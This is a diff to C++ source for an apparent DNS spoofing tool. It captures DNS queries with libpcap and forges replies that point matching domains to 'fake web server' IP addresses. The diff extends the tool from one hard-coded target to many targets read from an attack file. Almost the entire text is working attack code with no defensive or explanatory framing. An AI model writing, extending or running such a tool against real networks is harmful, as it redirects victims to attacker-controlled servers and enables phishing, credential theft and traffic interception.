@@ -15,15 +15,22 @@
 
 #include "protocol.hpp"
 
-char domain[1024];
-char fake_webserver_ip[16];
+char *attack_info_file;
 char *my_ip;
+std::vector<std::pair<std::string, std::string> > attack_list;
+std::vector<std::string> domain_array;
+std::vector<std::string> fake_web_server_array;
 
 int packet_capture_start(void);
 void packet_handler(u_char *param,const struct pcap_pkthdr *header, const u_char *pkt_data);
 void print_packet_data(const struct pcap_pkthdr *header, const u_char *pkt_data);
 void make_domain(const struct pcap_pkthdr *header, const u_char *pkt_data, char* result);
 char *set_my_ip(char *interface_name);
+
+std::vector<std::pair<std::string, std::string> > read_info_from_file(const char* file_name);
+std::vector<std::string> make_domain_arr(std::vector<std::pair<std::string, std::string> > attack_list);
+std::vector<std::string> make_fake_web_arr(std::vector<std::pair<std::string, std::string> > attack_list);
+bool compare_domain(const char *target_domain, std::vector<std::string> domain_array);
 
 int packet_capture_start(){
     struct bpf_program fcode;
@@ -38,11 +45,17 @@ int packet_capture_start(){
 	const unsigned char* pkt_data = NULL;
 
     const char * filter = "port 53 and (udp and (udp[10] & 128 = 0))";     // Recv
-    // const char * filter = "port 53 and (udp and (not udp[10] & 128 = 0))";  // Send
+    // const char * filter = "port 53 and (udp and (not udp[10] & 128 = 0))";  // Send\
+
+    attack_list = read_info_from_file(attack_info_file);
+
+    if(attack_list.size()==0){
+        return -1;
+    }
 
     if (pcap_findalldevs(&alldevs, errbuf) < 0) {
         printf("pcap_findalldevs error\n");
-        return -1;
+        return -2;
     }
 
     std::vector<char*> interface_list;
@@ -72,24 +85,24 @@ int packet_capture_start(){
 	scanf("%d", &select_interface_number);
 
     if(select_interface_number <1 || select_interface_number > interface_list.size()){
-        printf("Network interface out of range\n");
-        return -2;
+        printf("ERROR: Network interface out of range\n");
+        return -3;
     }    
 
     if (!(adhandle=pcap_open_live(interface_list[select_interface_number-1], 65536, 1, 1000, errbuf))) {
 		fprintf(stderr, "ERROR: %s\n", pcap_geterr(adhandle));
         pcap_freealldevs(alldevs);
-        return -3;
+        return -4;
     }
 
 	if (pcap_compile(adhandle, &fcode, filter, 1, mask) == -1) {
 		fprintf(stderr, "ERROR: %s\n", pcap_geterr(adhandle));
-        return -4;
+        return -5;
 	}
 
 	if (pcap_setfilter(adhandle, &fcode) == -1) {
 		fprintf(stderr, "ERROR: %s\n", pcap_geterr(adhandle));
-		return -5;
+		return -6;
 	}
 
     my_ip = set_my_ip(interface_list[select_interface_number-1]);
@@ -100,8 +113,10 @@ int packet_capture_start(){
     printf("└────┴─────────────────┴───────┴─────────────────┴───────┴───────────┴────────┴───┴─────────────────┘");
     fflush(stdout);
 
-    int break_loop_value;
     pcap_freealldevs(alldevs);
+
+    domain_array = make_domain_arr(attack_list);
+    fake_web_server_array = make_fake_web_arr(attack_list);
 
     while (1) {
         if ((pkt_data = pcap_next(adhandle, &header)) != NULL) {
@@ -118,6 +133,7 @@ void packet_handler(u_char *param,const struct pcap_pkthdr *header, const u_char
     udp_header *udp = (udp_header*)(pkt_data+sizeof(ether_header)+sizeof(ip_header));
     dns_header *dns = (dns_header*)(pkt_data + 42);
     char extract_domain[1024];
+    char fake_webserver_ip[16];
     memset(extract_domain, 0x00, 1024);
     make_domain(header, pkt_data, extract_domain);
 
@@ -125,7 +141,7 @@ void packet_handler(u_char *param,const struct pcap_pkthdr *header, const u_char
         return;
     }
 
-    if(strstr(domain, extract_domain)!=NULL){
+    if(compare_domain(extract_domain, domain_array)){
         char source_ip[16];
         char dest_ip[16];
         int sport = ntohs(udp->sport);
@@ -178,6 +194,12 @@ void packet_handler(u_char *param,const struct pcap_pkthdr *header, const u_char
         dns_reply_hdr[size+22]=0x00; dns_reply_hdr[size+23]=0x00;
         dns_reply_hdr[size+24]=0x00; dns_reply_hdr[size+25]=0x34;
         dns_reply_hdr[size+26]=0x00; dns_reply_hdr[size+27]=0x04;
+
+        for(int i=0;i<domain_array.size();i++){
+            if(strcmp(extract_domain, domain_array[i].c_str())==0){
+                strcpy(fake_webserver_ip,attack_list[i].first.c_str());
+            }
+        }
 
         unsigned char ip_in_hex[4];
         sscanf(fake_webserver_ip, "%d.%d.%d.%d",(int *)&ip_in_hex[0],(int *)&ip_in_hex[1], (int *)&ip_in_hex[2], (int *)&ip_in_hex[3]); //copy arg to int array
@@ -341,4 +363,69 @@ char *set_my_ip(char *interface_name){
     close(fd);
 
     return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
+}
+
+std::vector<std::pair<std::string, std::string> > read_info_from_file(const char* file_name){
+    std::vector<std::pair<std::string, std::string> > vec;
+
+    FILE *fp;
+    char line[256];
+    fp = fopen(file_name, "r"); 
+
+    if(fp==NULL){
+        printf("Error: fail to open file\n");
+        return vec;
+    }
+
+    while(!feof(fp)){
+        std::pair<std::string, std::string> temp;
+
+        char *ch = fgets(line, 80, fp);
+
+        if(ch!=NULL){
+            char *ip = strtok(line, " ");
+            char *domain = strtok(NULL, "\n");
+
+            std::string str_ip(ip);
+            std::string str_domain(domain);
+
+            temp = std::make_pair(str_ip, str_domain);
+
+            vec.push_back(temp);
+        }
+    }
+
+    fclose(fp);
+
+    return vec;
+}
+
+std::vector<std::string> make_domain_arr(std::vector<std::pair<std::string, std::string> > attack_list){
+    std::vector<std::string> temp;
+    
+    for(int i=0;i<attack_list.size();i++){
+        temp.push_back(attack_list[i].second);
+    }
+
+    return temp;
+}
+
+std::vector<std::string> make_fake_web_arr(std::vector<std::pair<std::string, std::string> > attack_list){
+    std::vector<std::string> temp;
+    
+    for(int i=0;i<attack_list.size();i++){
+        temp.push_back(attack_list[i].first);
+    }
+
+    return temp;
+}
+
+bool compare_domain(const char *target_domain, std::vector<std::string> domain_array){
+    for(int i=0;i<domain_array.size();i++){
+        if(strcmp(target_domain, domain_array[i].c_str())==0){
+            return true;
+        }
+    }
+
+    return false;
 }
